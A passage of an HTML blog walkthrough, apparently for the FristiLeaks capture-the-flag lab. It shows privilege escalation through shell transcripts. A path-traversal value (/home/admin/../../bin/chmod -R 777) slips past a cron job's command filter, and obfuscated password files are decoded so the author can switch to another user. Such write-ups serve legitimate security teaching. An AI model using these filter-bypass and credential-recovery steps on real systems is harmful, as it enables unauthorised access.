-</span><span class='line'>drwx<span class="ni">&amp;mdash;</span>r-x.  5 eezeepz   eezeepz   12288 Nov 18 15:35 eezeepz
-</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span>   2 fristigod fristigod  4096 Nov 19 01:40 fristigod
-</span><span class='line'>sh-4.1$
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>As we can see from above, home folder <code>eezeepz</code> has global read and execute permission for anyone.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span>ls -al
-</span><span class='line'>ls -al
-</span><span class='line'>total 2608
-</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;</span>r-x. <span class="m">5</span> eezeepz eezeepz  <span class="m">12288</span> Nov <span class="m">18</span> 15:35 .
-</span><span class='line'>drwxr-xr-x. <span class="m">5</span> root    root      <span class="m">4096</span> Nov <span class="m">19</span> 01:40 ..
-</span><span class='line'>drwxrwxr-x. <span class="m">2</span> eezeepz eezeepz   <span class="m">4096</span> Nov <span class="m">17</span> 09:40 .Old
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>. <span class="m">1</span> eezeepz eezeepz     <span class="m">18</span> Sep <span class="m">22</span> 12:40 .bash_logout
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>. <span class="m">1</span> eezeepz eezeepz    <span class="m">176</span> Sep <span class="m">22</span> 12:40 .bash_profile
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>. <span class="m">1</span> eezeepz eezeepz    <span class="m">124</span> Sep <span class="m">22</span> 12:40 .bashrc
-</span><span class='line'>drwxrwxr-x. <span class="m">2</span> eezeepz eezeepz   <span class="m">4096</span> Nov <span class="m">17</span> 09:40 .gnome
-</span><span class='line'>drwxrwxr-x. <span class="m">2</span> eezeepz eezeepz   <span class="m">4096</span> Nov <span class="m">17</span> 09:40 .settings
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">24376</span> Nov <span class="m">17</span> 09:49 MAKEDEV
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">33559</span> Nov <span class="m">17</span> 09:49 cbq
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">6976</span> Nov <span class="m">17</span> 09:49 cciss_id
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">56720</span> Nov <span class="m">17</span> 09:49 cfdisk
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">25072</span> Nov <span class="m">17</span> 09:49 chcpu
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">52936</span> Nov <span class="m">17</span> 09:48 chgrp
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">31800</span> Nov <span class="m">17</span> 09:49 chkconfig
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">48712</span> Nov <span class="m">17</span> 09:48 chmod
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">53640</span> Nov <span class="m">17</span> 09:48 chown
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">44528</span> Nov <span class="m">17</span> 09:49 clock
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">4808</span> Nov <span class="m">17</span> 09:49 consoletype
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">129992</span> Nov <span class="m">17</span> 09:48 cpio
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">38608</span> Nov <span class="m">17</span> 09:49 cryptsetup
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">5344</span> Nov <span class="m">17</span> 09:49 ctrlaltdel
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">41704</span> Nov <span class="m">17</span> 09:48 cut
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">14832</span> Nov <span class="m">17</span> 09:49 halt
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13712</span> Nov <span class="m">17</span> 09:49 hostname
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">44528</span> Nov <span class="m">17</span> 09:49 hwclock
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">7920</span> Nov <span class="m">17</span> 09:49 kbd_mode
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11576</span> Nov <span class="m">17</span> 09:49 <span class="nb">kill</span>
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">16472</span> Nov <span class="m">17</span> 09:49 killall5
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">32928</span> Nov <span class="m">17</span> 09:49 kpartx
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11464</span> Nov <span class="m">17</span> 09:49 nameif
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">171784</span> Nov <span class="m">17</span> 09:49 nano
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">5512</span> Nov <span class="m">17</span> 09:49 netreport
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">123360</span> Nov <span class="m">17</span> 09:49 netstat
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13892</span> Nov <span class="m">17</span> 09:49 new-kernel-pkg
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">25208</span> Nov <span class="m">17</span> 09:49 nice
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13712</span> Nov <span class="m">17</span> 09:49 nisdomainname
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">4736</span> Nov <span class="m">17</span> 09:49 nologin
-</span><span class='line'>-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>. <span class="m">1</span> eezeepz eezeepz    <span class="m">514</span> Nov <span class="m">18</span> 14:53 notes.txt
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">390616</span> Nov <span class="m">17</span> 09:49 tar
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11352</span> Nov <span class="m">17</span> 09:49 taskset
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">249000</span> Nov <span class="m">17</span> 09:49 tc
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">51536</span> Nov <span class="m">17</span> 09:49 telinit
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">47928</span> Nov <span class="m">17</span> 09:49 touch
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11440</span> Nov <span class="m">17</span> 09:49 tracepath
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">12304</span> Nov <span class="m">17</span> 09:49 tracepath6
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">21112</span> Nov <span class="m">17</span> 09:49 <span class="nb">true</span>
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">35608</span> Nov <span class="m">17</span> 09:49 tune2fs
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">15410</span> Nov <span class="m">17</span> 09:49 weak-modules
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">12216</span> Nov <span class="m">17</span> 09:49 wipefs
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">504400</span> Nov <span class="m">17</span> 09:49 xfs_repair
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13712</span> Nov <span class="m">17</span> 09:49 ypdomainname
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz     <span class="m">62</span> Nov <span class="m">17</span> 09:49 zcat
-</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">47520</span> Nov <span class="m">17</span> 09:47 zic
-</span><span class='line'>sh-4.1<span class="err">$</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Well, it is really mess. but we can notice that there is another <code>notes.txt</code> which should be more clues in it.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span>cat notes.txt
-</span><span class='line'>cat notes.txt
-</span><span class='line'>Yo EZ,&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;I made it possible <span class="k">for</span> you to <span class="k">do</span> some automated checks,
-</span><span class='line'>but I did only allow you access to /usr/bin/* system binaries. I did
-</span><span class='line'>however copy a few extra often needed commands to my
-</span><span class='line'>homedir: chmod, df, cat, <span class="nb">echo</span>, ps, grep, egrep so you can use those
-</span><span class='line'>from /home/admin/&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Don<span class="p">&amp;</span>rsquo<span class="p">;</span>t forget to specify the full path <span class="k">for</span> each binary!&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Just put a file called <span class="p">&amp;</span>ldquo<span class="p">;</span>runthis<span class="p">&amp;</span>rdquo<span class="p">;</span> in /tmp/, each line one command. The
-</span><span class='line'>output goes to the file <span class="p">&amp;</span>ldquo<span class="p">;</span>cronresult<span class="p">&amp;</span>rdquo<span class="p">;</span> in /tmp/. It should
-</span><span class='line'>run every minute with my account privileges.&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;ul&gt;
-</span><span class='line'>&lt;li&gt;Jerry
-</span><span class='line'>sh-4.1<span class="err">$</span>
-</span></code></pre></td></tr></table></div></figure></li>
-</ul>
-
-
-<p>Looks like I have to break out of jail from <code>runthis</code>. So I create the file <code>runthis</code> under <code>/tmp</code>, which only including one command <code>chmod 777 /home/admin</code> to change folder permission of <code>/home/admin</code>. However, after couple of seconds waiting, I got the error information: <code>command did not start with /home/admin or /usr/bin</code>.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>cat /tmp/run&lt;br/&gt;
-</span><span class='line'>cat /tmp/runthis
-</span><span class='line'>chmod <span class="m">777</span> /home/admin
-</span><span class='line'>bash-4.1<span class="nv">$ </span>cat /tmp/cron
-</span><span class='line'>cat /tmp/cronresult
-</span><span class='line'><span class="nb">command </span>did not start with /home/admin or /usr/bin
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Ok ok&hellip; so the command have to start with <code>/home/admin</code> or <code>/usr/bin</code>, so I modified the <code>runthis</code> file to <code>/home/admin/../../bin/chmod -R 777 /home/admin</code>, and waiting seconds, the <code>/home/admin</code> has been set to full permission now!</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -al /home
-</span><span class='line'>ls -al /home
-</span><span class='line'>total 28
-</span><span class='line'>drwxr-xr-x.  <span class="m">5</span> root      root       <span class="m">4096</span> Nov <span class="m">19</span> 01:40 .
-</span><span class='line'>dr-xr-xr-x. <span class="m">22</span> root      root       <span class="m">4096</span> Dec <span class="m">27</span> 17:50 ..
-</span><span class='line'>drwxrwxrwx.  <span class="m">2</span> admin     admin      <span class="m">4096</span> Nov <span class="m">19</span> 02:03 admin
-</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;</span>r-x.  <span class="m">5</span> eezeepz   eezeepz   <span class="m">12288</span> Nov <span class="m">18</span> 15:35 eezeepz
-</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">2</span> fristigod fristigod  <span class="m">4096</span> Nov <span class="m">19</span> 01:40 fristigod
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Get into <code>/home/admin</code> and enumeration, found three suspect files: <code>cryptedpass.txt</code>, <code>cryptpass.py</code> and <code>whoisyourgodnow.txt</code>.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">pwd</span>
-</span><span class='line'><span class="nb">pwd</span>
-</span><span class='line'>/home/admin
-</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -al
-</span><span class='line'>ls -al
-</span><span class='line'>total 652
-</span><span class='line'>drwxrwxrwx. <span class="m">2</span> admin     admin       <span class="m">4096</span> Nov <span class="m">19</span> 02:03 .
-</span><span class='line'>drwxr-xr-x. <span class="m">5</span> root      root        <span class="m">4096</span> Nov <span class="m">19</span> 01:40 ..
-</span><span class='line'>-rwxrwxrwx. <span class="m">1</span> admin     admin         <span class="m">18</span> Sep <span class="m">22</span> 12:40 .bash_logout
-</span><span class='line'>-rwxrwxrwx. <span class="m">1</span> admin     admin        <span class="m">176</span> Sep <span class="m">22</span> 12:40 .bash_profile
-</span><span class='line'>-rwxrwxrwx. <span class="m">1</span> admin     admin        <span class="m">124</span> Sep <span class="m">22</span> 12:40 .bashrc
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">45224</span> Nov <span class="m">18</span> 13:42 cat
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">48712</span> Nov <span class="m">18</span> 14:14 chmod
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin        <span class="m">737</span> Nov <span class="m">18</span> 14:48 cronjob.py
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin         <span class="m">21</span> Nov <span class="m">18</span> 15:21 cryptedpass.txt
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin        <span class="m">258</span> Nov <span class="m">18</span> 15:20 cryptpass.py
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">90544</span> Nov <span class="m">18</span> 13:49 df
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">24136</span> Nov <span class="m">18</span> 13:40 <span class="nb">echo</span>
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin     <span class="m">163600</span> Nov <span class="m">18</span> 13:42 egrep
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin     <span class="m">163600</span> Nov <span class="m">18</span> 13:42 grep
-</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">85304</span> Nov <span class="m">18</span> 13:41 ps
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> fristigod fristigod     <span class="m">25</span> Nov <span class="m">19</span> 01:47 whoisyourgodnow.txt
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>The file <code>cryptedpass.txt</code> contain crypted string <code>mVGZ3O3omkJLmy2pcuTq</code> and the file <code>cryptpass.py</code> seems a crypto program which the process is</p>
-
-<ul>
-<li>base64 encoded</li>
-<li>reverse the string</li>
-<li>encode the reversed string via rot13</li>
-</ul>
-
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat cryptedpass.txt
-</span><span class='line'>mVGZ3O3omkJLmy2pcuTq
-</span><span class='line'>bash-4.1<span class="nv">$ </span>cat cryptpass.py
-</span><span class='line'>cat cryptpass.py&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h1&gt;Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn&lt;/h1&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;import base64,codecs,sys&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;def encodeString<span class="o">(</span>str<span class="o">)</span>:
-</span><span class='line'>    <span class="nv">base64string</span><span class="o">=</span> base64.b64encode<span class="o">(</span>str<span class="o">)</span>
-</span><span class='line'>    <span class="k">return</span> codecs.encode<span class="o">(</span>base64string<span class="o">[</span>::-1<span class="o">]</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>rot13<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;cryptoResult<span class="o">=</span>encodeString<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">])</span>
-</span><span class='line'>print cryptoResult
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>By using python, I decoded the secret string and got the plain text is <code>thisisalsopw123</code>.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;blockquote&gt;&lt;blockquote&gt;&lt;blockquote&gt;&lt;p&gt;import base64
-</span><span class='line'><span class="nv">cryptedtxt</span><span class="o">=</span><span class="p">&amp;</span>lsquo<span class="p">;</span>mVGZ3O3omkJLmy2pcuTq<span class="p">&amp;</span>rsquo<span class="p">;</span>
-</span><span class='line'>base64.b64decode<span class="o">((</span>cryptedtxt.decode<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>rot13<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)[</span>::-1<span class="o">]))</span>
-</span><span class='line'><span class="p">&amp;</span>lsquo<span class="p">;</span>thisisalsopw123<span class="p">&amp;</span>rsquo<span class="p">;</span>
-</span></code></pre></td></tr></table></div></figure></p></blockquote></blockquote></blockquote>
-
-<p>The same method to crack the secret string in <code>whoisyourgodnow.txt</code></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;blockquote&gt;&lt;blockquote&gt;&lt;blockquote&gt;&lt;p&gt;cryptedtxt<span class="o">=</span><span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">=</span>RFn0AKnlMHMPIzpyuTI0ITG<span class="p">&amp;</span>rsquo<span class="p">;</span>
-</span><span class='line'>base64.b64decode<span class="o">((</span>cryptedtxt.decode<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>rot13<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)[</span>::-1<span class="o">]))</span>
-</span><span class='line'><span class="p">&amp;</span>lsquo<span class="p">;</span>LetThereBeFristi!<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;
-</span></code></pre></td></tr></table></div></figure></p></blockquote></blockquote></blockquote>
-
-<p>My best guess is that <font color="red"><code>LetThereBeFristi!</code></font> is the password of the user <font color="red"><code>fristigod</code></font> &hellip; and &hellip; Yes! I am <code>fristigod</code> now!</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>su fristigod
-</span><span class='line'>su fristigod
-</span><span class='line'>Password: LetThereBeFristi!&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;bash-4.1<span class="nv">$ </span>id
-</span><span class='line'>id
-</span><span class='line'><span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span>
-</span><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> /home
-</span><span class='line'><span class="nb">cd</span> /home
-</span><span class='line'>bash-4.1<span class="nv">$ </span>ls
-</span><span class='line'>ls
-</span><span class='line'>admin  eezeepz  fristigod
-</span><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">cd </span>fristigod
-</span><span class='line'><span class="nb">cd </span>fristigod
-</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -al
-</span><span class='line'>ls -al
-</span><span class='line'>total 20
-</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> fristigod fristigod <span class="m">4096</span> Nov <span class="m">19</span> 01:40 .
-</span><span class='line'>drwxr-xr-x. <span class="m">5</span> root      root      <span class="m">4096</span> Nov <span class="m">19</span> 01:40 ..
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> fristigod fristigod   <span class="m">18</span> Sep <span class="m">22</span> 12:40 .bash_logout
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> fristigod fristigod  <span class="m">176</span> Sep <span class="m">22</span> 12:40 .bash_profile
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> fristigod fristigod  <span class="m">124</span> Sep <span class="m">22</span> 12:40 .bashrc
-</span><span class='line'>bash-4.1<span class="err">$</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>After enumeration, I found something interesting:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>sudo -l
-</span><span class='line'>sudo -l
-</span><span class='line'><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> fristigod: LetThereBeFristi!&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Matching Defaults entries <span class="k">for</span> fristigod on this host:
-</span><span class='line'>    requiretty, !visiblepw, always_set_home, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span>COLORS
-</span><span class='line'>    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS<span class="p">&amp;</span>rdquo<span class="p">;</span>, env_keep+<span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span>MAIL PS1
-</span><span class='line'>    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE<span class="p">&amp;</span>rdquo<span class="p">;</span>, env_keep+<span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span>LC_COLLATE
-</span><span class='line'>    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES<span class="p">&amp;</span>rdquo<span class="p">;</span>, env_keep+<span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span>LC_MONETARY
-</span><span class='line'>    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE<span class="p">&amp;</span>rdquo<span class="p">;</span>, env_keep+<span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span>LC_TIME LC_ALL
